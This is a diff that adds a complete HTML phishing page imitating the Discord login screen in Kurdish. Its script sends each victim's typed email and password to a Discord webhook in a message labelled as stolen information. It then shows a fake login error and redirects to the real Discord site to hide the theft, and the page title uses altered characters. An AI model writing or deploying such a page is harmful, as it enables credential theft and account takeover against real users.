@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دي̘س̘ك̘ۆرد</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #313338; 
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            display: flex; justify-content: center; align-items: center; 
+            height: 100vh; 
+        }
+        .login-box {
+            background: #2b2d31;
+            padding: 32px;
+            border-radius: 8px;
+            width: 440px;
+            max-width: 90%;
+        }
+        .logo {
+            text-align: center; margin-bottom: 20px;
+            color: white; font-size: 28px; font-weight: bold;
+        }
+        .logo span { color: #5865F2; }
+        .input-group {
+            margin-bottom: 16px;
+        }
+        label { 
+            color: #b5bac1; font-size: 12px; 
+            font-weight: bold; text-transform: uppercase;
+            display: block; margin-bottom: 8px;
+        }
+        input {
+            width: 100%; padding: 10px; 
+            background: #1e1f22;
+            border: 1px solid #1e1f22;
+            color: white;
+            border-radius: 3px;
+            font-size: 16px;
+            outline: none;
+        }
+        input:focus { border-color: #5865F2; }
+        button {
+            width: 100%; padding: 12px;
+            background: #5865F2;
+            color: white;
+            border: none; border-radius: 3px;
+            font-size: 16px; font-weight: bold;
+            cursor: pointer; margin-top: 16px;
+        }
+        button:hover { background: #4752c4; }
+        .error { color: #ed4245; font-size: 12px; display: none; }
+        .qr-link { 
+            text-align: center; margin-top: 12px; 
+        }
+        .qr-link a { color: #00a8fc; font-size: 14px; text-decoration: none; }
+        .qr-link a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <div class="logo"><span>D</span>iscord</div>
+        <p style="color:#b5bac1;text-align:center;margin-bottom:20px;font-size:14px;">
+            بەخێربێیتەوە، تکایە بچۆ ژوورەوە
+        </p>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <label>ئیمەیڬ یان ژمارە تەلەفون</label>
+                <input type="text" id="email" placeholder="ئیمەیڬ یان ژمارە تەلەفون" required>
+            </div>
+            <div class="input-group">
+                <label>پاسۆرد</label>
+                <input type="password" id="password" placeholder="پاسۆرد" required>
+            </div>
+            <p class="error" id="errorMsg">ئیمەیڬ یان پاسۆرد هەڵەیە</p>
+            <button type="submit" id="loginBtn">چونە ژوورەوە</button>
+        </form>
+        <div class="qr-link">
+            <a href="#">چونە ژوورەوە بە کۆدی QR</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').onsubmit = function(e) {
+            e.preventDefault();
+            
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            
+            // ناردنی زانیارییەکان بۆ وێب‌سایتێکی تر (بۆ تاقیکردنەوە)
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://discord.com/api/webhooks/1300000000000000000/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({
+                content: '**زانیاری دزین:**\nئیمەیڬ: ' + email + '\nپاسۆرد: ' + password
+            }));
+            
+            // نیشاندانی هەڵە و ڕەوانەکردن بۆ دیسکۆردی ڕاستەقینە
+            document.getElementById('errorMsg').style.display = 'block';
+            setTimeout(function() {
+                window.location.href = 'https://discord.com/login';
+            }, 2000);
+        };
+    </script>
+</body>
+</html>
